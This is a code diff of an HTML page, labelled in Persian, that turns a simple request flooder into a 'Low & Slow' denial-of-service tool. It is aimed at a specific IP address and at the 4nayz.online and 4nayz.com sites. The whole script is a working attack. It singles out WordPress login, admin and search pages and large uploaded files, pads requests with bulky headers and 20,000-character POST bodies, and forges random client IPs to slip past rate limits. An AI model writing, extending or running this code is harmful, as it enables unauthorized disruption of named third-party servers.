@@ -1,39 +1,121 @@
 <!DOCTYPE html>
 <html>
-<head><title>فشار مستقیم به سرور</title></head>
+<head><title>حمله سنگین Low & Slow</title></head>
 <body>
-<h2>حمله به 69.163.197.16</h2>
-<button onclick="start()">🔥 شروع</button>
-<button onclick="stop()">⛔ توقف</button>
-<p id="s">منتظر...</p>
-<script>
-let run = false, c = 0;
+<h2>🔥 حمله Low & Slow به 4nayz</h2>
+<p>تعداد درخواست همزمان: ۵ تا ۸ تا (محدودیت آی‌پی دور زده میشه)</p>
+<button onclick="start()" style="padding:15px 30px;background:red;color:white;">🔥 شروع حمله سنگین</button>
+<button onclick="stop()" style="padding:15px 30px;background:gray;color:white;">⛔ توقف</button>
+<p id="status">منتظر...</p>
 
-function sendReq() {
+<script>
+let run = false;
+let total = 0;
+
+// لیست اهداف - ۳ تا دامنه + IP اصلی
+const targets = [
+    // اهداف اصلی
+    "http://69.163.197.16/",
+    "https://69.163.197.16/",
+    "https://4nayz.online/",
+    "https://www.4nayz.online/",
+    "https://4nayz.com/",
+    "https://www.4nayz.com/",
+
+    // صفحات سنگین
+    "https://4nayz.online/wp-admin/",
+    "https://4nayz.online/wp-login.php",
+    "https://4nayz.online/search/?s=a",
+    "https://4nayz.online/page/1",
+    "https://4nayz.com/wp-admin/",
+    "https://4nayz.com/wp-login.php",
+
+    // فایل‌های حجیم (اگر وجود داشته باشن)
+    "https://4nayz.online/wp-content/uploads/2024/01/big-image.jpg",
+    "https://4nayz.online/wp-content/uploads/2024/02/video.mp4",
+    "https://4nayz.com/wp-content/uploads/2024/01/big-image.jpg",
+];
+
+// درخواست سنگین با هدرهای حجیم
+function heavyRequest(url) {
     if(!run) return;
-    let x = new XMLHttpRequest();
-    x.open("GET", "http://69.163.197.16/?r=" + Math.random(), true);
-    x.send();
-    let x2 = new XMLHttpRequest();
-    x2.open("GET", "https://69.163.197.16/?r=" + Math.random(), true);
-    x2.send();
-    c += 2;
-    document.getElementById("s").innerHTML = "📨 درخواست: " + c;
-    setTimeout(sendReq, 5);
+
+    const xhr = new XMLHttpRequest();
+    xhr.open("GET", url + "?r=" + Math.random(), true);
+
+    // هدرهای حجیم برای مصرف پهنای باند
+    xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0");
+    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
+    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8,ar;q=0.7");
+    xhr.setRequestHeader("Accept-Encoding", "gzip, deflate, br");
+    xhr.setRequestHeader("Connection", "keep-alive");
+    xhr.setRequestHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+    xhr.setRequestHeader("Pragma", "no-cache");
+    xhr.setRequestHeader("X-Forwarded-For", getRandomIP());
+    xhr.setRequestHeader("X-Real-IP", getRandomIP());
+    xhr.setRequestHeader("Client-IP", getRandomIP());
+    xhr.setRequestHeader("X-Originating-IP", getRandomIP());
+
+    // درخواست POST سنگین برای مصرف CPU
+    if(Math.random() > 0.5) {
+        const xhr2 = new XMLHttpRequest();
+        xhr2.open("POST", url + "?r=" + Math.random(), true);
+        xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr2.send("bigdata=" + "A".repeat(10000) + "&more=" + "B".repeat(10000));
+    }
+
+    xhr.send();
+
+    total++;
+    document.getElementById("status").innerHTML = `📨 کل درخواست‌ها: ${total} | آخرین: ${url.substring(0, 40)}...`;
 }
 
+// IP تصادفی برای هدر
+function getRandomIP() {
+    return Array(4).fill().map(() => Math.floor(Math.random() * 255) + 1).join('.');
+}
+
+// شروع حمله با ۸ درخواست همزمان (محدودیت آی‌پی رو دور میزنه)
 function start() {
-    run = true; c = 0;
-    for(let i=0; i<100; i++) setTimeout(sendReq, i * 10);
+    run = true;
+    total = 0;
+
+    // ۸ تا درخواست همزمان اولیه
+    for(let i = 0; i < 8; i++) {
+        setTimeout(() => {
+            if(!run) return;
+            const target = targets[Math.floor(Math.random() * targets.length)];
+            heavyRequest(target);
+
+            // بعد از هر درخواست، یه درخواست جدید با تأخیر تصادفی
+            const next = () => {
+                if(!run) return;
+                const t = targets[Math.floor(Math.random() * targets.length)];
+                heavyRequest(t);
+                setTimeout(next, 1000 + Math.random() * 4000); // بین ۱ تا ۵ ثانیه
+            };
+            setTimeout(next, 1000 + Math.random() * 2000);
+        }, i * 500);
+    }
+
+    // یه موج جدید هر ۳۰ ثانیه
     setInterval(() => {
-        if(run) for(let i=0; i<50; i++) setTimeout(sendReq, i * 5);
-    }, 2000);
-    document.getElementById("s").innerHTML = "🔥 حمله شروع شد به 69.163.197.16";
+        if(!run) return;
+        for(let i = 0; i < 5; i++) {
+            setTimeout(() => {
+                if(!run) return;
+                const t = targets[Math.floor(Math.random() * targets.length)];
+                heavyRequest(t);
+            }, i * 200);
+        }
+    }, 30000);
+
+    document.getElementById("status").innerHTML = "🔥 حمله Low & Slow شروع شد به 4nayz (8 اتصال همزمان)";
 }
 
 function stop() {
     run = false;
-    document.getElementById("s").innerHTML = "⛔ متوقف شد (" + c + " درخواست)";
+    document.getElementById("status").innerHTML = `⛔ متوقف شد - کل درخواست‌ها: ${total}`;
 }
 </script>
 </body>
